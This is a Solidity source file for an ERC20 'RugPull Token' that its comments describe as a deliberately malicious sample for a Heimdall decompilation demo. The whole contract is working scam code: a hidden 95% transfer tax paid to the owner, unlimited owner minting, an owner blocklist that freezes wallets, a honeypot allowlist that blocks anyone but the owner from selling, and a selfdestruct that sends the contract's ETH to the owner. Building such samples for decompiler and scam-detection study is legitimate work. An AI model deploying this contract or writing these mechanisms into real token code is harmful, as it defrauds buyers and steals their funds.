// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MaliciousRugToken
 * @dev Deliberately malicious ERC20 for Heimdall decompilation demo.
 *      DO NOT use in production. This contract contains:
 *        1. 95% hidden tax on all transfers (routed to owner)
 *        2. Owner-only selfdestruct (can rug-pull all ETH)
 *        3. Unlimited owner minting (inflation attack)
 *        4. Transfer blocklist (owner can freeze any wallet)
 *        5. Owner-only allowlist for selling (honeypot pattern)
 */
contract MaliciousRugToken {
    string public name = "RugPull Token";
    string public symbol = "RUG";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;
    uint256 private _taxBasisPoints = 9500; // 95% hidden tax
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blocked;        // blocklist
    mapping(address => bool) public allowedSellers;  // honeypot allowlist

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        allowedSellers[msg.sender] = true;
        _mint(msg.sender, 1_000_000 * 10**18);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    // VULNERABILITY 1: Unlimited owner minting
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    // VULNERABILITY 2: Hidden 95% tax on all transfers
    function transfer(address to, uint256 amount) external returns (bool) {
        require(!blocked[msg.sender], "blocked");
        require(allowedSellers[msg.sender] || msg.sender == owner, "not allowed to sell");
        
        uint256 tax = (amount * _taxBasisPoints) / 10000;
        uint256 net = amount - tax;
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += net;
        balanceOf[owner] += tax;  // tax goes to owner
        
        emit Transfer(msg.sender, to, net);
        if (tax > 0) emit Transfer(msg.sender, owner, tax);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(!blocked[from], "blocked");
        require(allowedSellers[from] || from == owner, "not allowed to sell");
        require(allowance[from][msg.sender] >= amount, "allowance");
        
        allowance[from][msg.sender] -= amount;
        
        uint256 tax = (amount * _taxBasisPoints) / 10000;
        uint256 net = amount - tax;
        
        balanceOf[from] -= amount;
        balanceOf[to] += net;
        balanceOf[owner] += tax;
        
        emit Transfer(from, to, net);
        if (tax > 0) emit Transfer(from, owner, tax);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    // VULNERABILITY 3: Owner can block any wallet (freeze funds)
    function blockAddress(address target) external onlyOwner {
        blocked[target] = true;
    }

    // VULNERABILITY 4: Owner controls who can sell (honeypot)
    function setAllowedSeller(address seller, bool allowed) external onlyOwner {
        allowedSellers[seller] = allowed;
    }

    // VULNERABILITY 5: Owner can selfdestruct and steal all ETH
    function emergencyWithdraw() external onlyOwner {
        selfdestruct(payable(owner));
    }

    // Accept ETH deposits
    receive() external payable {}
}
